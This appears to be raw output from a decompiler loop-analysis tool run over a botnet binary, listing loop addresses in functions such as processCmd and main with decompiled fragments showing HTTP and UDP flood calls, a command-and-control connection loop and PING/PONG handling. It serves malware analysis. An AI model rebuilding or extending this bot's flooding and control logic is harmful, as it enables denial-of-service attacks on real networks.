++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 51 @ processCmd ====================================
++++++++ WHILE START : 19474 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19480 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 54 @ processCmd ====================================
++++++++ WHILE START : 19556 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19575 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHTTP(v223, v222, (int16_t)v322, v221, v220, atol(*(int32_t *)v251, v251));
=============================WHILE LOOPS ID : 56 @ processCmd ====================================
++++++++ WHILE START : 19653 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19659 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 59 @ processCmd ====================================
++++++++ WHILE START : 19718 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19724 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 61 @ processCmd ====================================
++++++++ WHILE START : 19776 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19782 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 65 @ processCmd ====================================
++++++++ WHILE START : 19891 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19897 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 69 @ processCmd ====================================
++++++++ WHILE START : 20024 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20030 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 72 @ processCmd ====================================
++++++++ WHILE START : 20085 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20091 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 73 @ processCmd ====================================
++++++++ WHILE START : 20124 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20130 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 74 @ processCmd ====================================
++++++++ WHILE START : 20179 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20185 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 75 @ processCmd ====================================
++++++++ WHILE START : 20252 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20258 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 76 @ processCmd ====================================
++++++++ WHILE START : 20277 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20283 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 77 @ processCmd ====================================
++++++++ WHILE START : 20316 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20322 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 78 @ processCmd ====================================
++++++++ WHILE START : 20371 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20377 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 79 @ processCmd ====================================
++++++++ WHILE START : 20464 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20470 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 20489 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20495 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 81 @ processCmd ====================================
++++++++ WHILE START : 20528 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20534 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 20583 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20589 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 20615 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20621 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 20676 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20682 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 85 @ processCmd ====================================
++++++++ WHILE START : 20701 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20707 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 20740 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20746 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 20795 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20801 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 88 @ processCmd ====================================
++++++++ WHILE START : 20868 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20874 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 89 @ processCmd ====================================
++++++++ WHILE START : 20893 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20899 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 90 @ processCmd ====================================
++++++++ WHILE START : 20932 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20938 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 91 @ processCmd ====================================
++++++++ WHILE START : 20987 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20993 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 92 @ processCmd ====================================
++++++++ WHILE START : 21087 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21093 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 93 @ processCmd ====================================
++++++++ WHILE START : 21112 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21118 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 94 @ processCmd ====================================
++++++++ WHILE START : 21151 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21157 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 95 @ processCmd ====================================
++++++++ WHILE START : 21206 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21212 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 96 @ processCmd ====================================
++++++++ WHILE START : 21238 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21244 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 97 @ processCmd ====================================
++++++++ WHILE START : 21277 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21283 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 98 @ processCmd ====================================
++++++++ WHILE START : 21326 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21332 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 99 @ processCmd ====================================
++++++++ WHILE START : 21352 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21369 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v228, v254, v255, v256, v257, v225, v231);
=============================WHILE LOOPS ID : 100 @ processCmd ====================================
++++++++ WHILE START : 21474 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21480 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 101 @ processCmd ====================================
++++++++ WHILE START : 21532 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21538 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 102 @ processCmd ====================================
++++++++ WHILE START : 21562 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21568 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 103 @ processCmd ====================================
++++++++ WHILE START : 21601 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21607 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 104 @ processCmd ====================================
++++++++ WHILE START : 21650 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21656 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 105 @ processCmd ====================================
++++++++ WHILE START : 21726 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21732 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 106 @ processCmd ====================================
++++++++ WHILE START : 21756 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21762 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 107 @ processCmd ====================================
++++++++ WHILE START : 21795 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21801 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 108 @ processCmd ====================================
++++++++ WHILE START : 21844 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21850 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 109 @ processCmd ====================================
++++++++ WHILE START : 21870 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21876 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 110 @ processCmd ====================================
++++++++ WHILE START : 21967 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 21973 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 111 @ processCmd ====================================
++++++++ WHILE START : 22025 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22031 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 112 @ processCmd ====================================
++++++++ WHILE START : 22055 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22061 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 113 @ processCmd ====================================
++++++++ WHILE START : 22094 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22100 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 114 @ processCmd ====================================
++++++++ WHILE START : 22143 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22149 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 115 @ processCmd ====================================
++++++++ WHILE START : 22219 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22225 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 116 @ processCmd ====================================
++++++++ WHILE START : 22249 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22255 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 117 @ processCmd ====================================
++++++++ WHILE START : 22288 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22294 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 118 @ processCmd ====================================
++++++++ WHILE START : 22337 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22343 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 119 @ processCmd ====================================
++++++++ WHILE START : 22538 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22544 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 120 @ processCmd ====================================
++++++++ WHILE START : 22596 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22602 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 121 @ processCmd ====================================
++++++++ WHILE START : 22626 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22632 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 122 @ processCmd ====================================
++++++++ WHILE START : 22665 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22671 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 123 @ processCmd ====================================
++++++++ WHILE START : 22714 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22720 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 124 @ processCmd ====================================
++++++++ WHILE START : 22773 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22779 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 125 @ processCmd ====================================
++++++++ WHILE START : 22793 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22799 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 126 @ processCmd ====================================
++++++++ WHILE START : 22903 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22909 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 127 @ processCmd ====================================
++++++++ WHILE START : 22944 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 22950 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 128 @ processCmd ====================================
++++++++ WHILE START : 22997 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23003 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 129 @ processCmd ====================================
++++++++ WHILE START : 23017 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23023 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 130 @ processCmd ====================================
++++++++ WHILE START : 23114 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23120 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 131 @ processCmd ====================================
++++++++ WHILE START : 23155 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23161 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 132 @ processCmd ====================================
++++++++ WHILE START : 23208 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23214 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 133 @ processCmd ====================================
++++++++ WHILE START : 23435 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23441 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 134 @ processCmd ====================================
++++++++ WHILE START : 23476 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23482 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 135 @ processCmd ====================================
++++++++ WHILE START : 23529 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23535 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 136 @ processCmd ====================================
++++++++ WHILE START : 23549 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23555 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 137 @ processCmd ====================================
++++++++ WHILE START : 23659 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23665 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 138 @ processCmd ====================================
++++++++ WHILE START : 23700 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23706 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 139 @ processCmd ====================================
++++++++ WHILE START : 23753 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23759 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 140 @ processCmd ====================================
++++++++ WHILE START : 23773 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23779 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 141 @ processCmd ====================================
++++++++ WHILE START : 23867 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23873 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 142 @ processCmd ====================================
++++++++ WHILE START : 23908 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23914 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 143 @ processCmd ====================================
++++++++ WHILE START : 23959 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23965 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 144 @ processCmd ====================================
++++++++ WHILE START : 24148 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24154 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 145 @ processCmd ====================================
++++++++ WHILE START : 24189 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24195 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 146 @ processCmd ====================================
++++++++ WHILE START : 24240 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24246 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 147 @ processCmd ====================================
++++++++ WHILE START : 24260 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24266 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 148 @ processCmd ====================================
++++++++ WHILE START : 24364 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24370 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 149 @ processCmd ====================================
++++++++ WHILE START : 24404 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24410 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 150 @ processCmd ====================================
++++++++ WHILE START : 24454 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24460 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 151 @ processCmd ====================================
++++++++ WHILE START : 24474 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24480 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 152 @ processCmd ====================================
++++++++ WHILE START : 24565 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24571 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 153 @ processCmd ====================================
++++++++ WHILE START : 24605 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24611 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 154 @ processCmd ====================================
++++++++ WHILE START : 24655 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24661 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 155 @ getOurIP ====================================
++++++++ WHILE START : 25198 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 25305 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v228, 0x1000, v226) != 0) {
		if (strstr(v228, "\t00000000\t", 0x10020000) != 0) {
		__libc_close(v226);
		__libc_close(v220);
		__libc_close(v220);
		__libc_close(v226);
		__libc_close(v220);
		__libc_close(v220);
		__libc_close(v226);
		__libc_close(v220);
		__libc_close(v220);
=============================WHILE LOOPS ID : 156 @ main ====================================
++++++++ WHILE START : 25810 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 26250 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		fgets(v237, 1024, v214);
		if (__GI_strcasecmp(v237, v236) == 0) {
		__GI_fclose((int16_t *)v214);
		int32_t v242 = __GI_fopen((int32_t)v215, (int32_t)&v241); // 0x10009ff0
		__GI_fclose((int16_t *)v242);
		getOurIP();
		v223 = __libc_fork();
		if (__libc_fork() == 0) {
		zprintf((int32_t)"fork failed\n", 0x10020000);
		while (true) {
		if (initConnection() != 0) {
		while (true) {
		if (initConnection() == 0) {
		v248 = getBuild((int32_t)&v244);
		__GI_inet_ntoa(&v247, (int32_t)&v244);
		sockprintf(v245, (int32_t)"Connected %s:%s", v248);
		while (true) {
		while (true) {
		if (recvLine(v217, (char *)&v218, 0x1000, v227) == -1) {
		while (true) {
		if (__libc_waitpid(v256, 0, 1) >= 1) {
		while (true) {
		while (true) {
		free();
		if (strstr(v227, "PING", (int32_t)&v262) == v227) {
		sockprintf(v217, (int32_t)"PONG", 0x10020000);
		if (strstr(v227, "DUP", 0x10020000) == v227) {
		zprintf((int32_t)"PEACE OUT IMMA DUP\n", 0x10020000);
		while (true) {
		if (initConnection() == 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (listFork() == 0) {
		while (true) {
		processCmd(v282, &v233);
		processCmd(v282, &v233);
		while (true) {
		free();
		free();
		while (true) {
		if (__libc_waitpid(v256, 0, 1) < 1) {
		v248 = getBuild((int32_t)&v244);
		__GI_inet_ntoa(&v247, (int32_t)&v244);
		sockprintf(v245, (int32_t)"Connected %s:%s", v248);
		__libc_waitpid(v223, (int32_t)&v220, 0);
		zprintf((int32_t)"fork failed\n", 0x10020000);
		while (true) {
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 158 @ main ====================================
++++++++ WHILE START : 26287 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 26293 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 159 @ main ====================================
++++++++ WHILE START : 26310 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 26316 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 160 @ main ====================================
++++++++ WHILE START : 26341 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 26347 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 161 @ main ====================================
++++++++ WHILE START : 26364 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 26370 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 162 @ main ====================================
++++++++ WHILE START : 26377 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 26394 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v225, 1024, v291) == 0) {
		fdpclose(v291);
		sockprintf(v217, (int32_t)"%s", v225);
=============================WHILE LOOPS ID : 167 @ _vfprintf_internal ====================================
++++++++ WHILE START : 37200 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 37889 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 170 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 39287 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 40102 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 172 @ _stdio_openlist_dec_use ====================================
++++++++ WHILE START : 41088 
++++++++ WHILE FUNCTION : _stdio_openlist_dec_use 
++++++++ WHILE END : 41116 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
=============================WHILE LOOPS ID : 175 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 41713 
++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 41782 
++++++++ INTRESTING INSTRUCTIONS :  
		char v227 = getc_unlocked((int16_t *)a3, v223); // 0x1000cfac
=============================WHILE LOOPS ID : 189 @ strstr ====================================
++++++++ WHILE START : 45417 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 45480 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 197 @ gethostbyname_r ====================================
++++++++ WHILE START : 50147 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 50178 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 198 @ gethostbyname_r ====================================
++++++++ WHILE START : 50288 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 50319 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 199 @ gethostbyname_r ====================================
++++++++ WHILE START : 50423 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 50454 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 200 @ gethostbyname_r ====================================
++++++++ WHILE START : 50556 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 50592 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 201 @ gethostbyname_r ====================================
++++++++ WHILE START : 50701 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 50735 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 205 @ srandom_r ====================================
++++++++ WHILE START : 58196 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 58237 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_random_r((int32_t *)v222, (int32_t)&v223);
		__GI_random_r((int32_t *)v222, (int32_t)&v223);
=============================WHILE LOOPS ID : 206 @ _stdlib_strto_l ====================================
++++++++ WHILE START : 59460 
++++++++ WHILE FUNCTION : _stdlib_strto_l 
++++++++ WHILE END : 59729 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 211 @ __stdio_WRITE ====================================
++++++++ WHILE START : 66300 
++++++++ WHILE FUNCTION : __stdio_WRITE 
++++++++ WHILE END : 66385 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 214 @ _fpmaxtostr ====================================
++++++++ WHILE START : 68218 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 71893 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
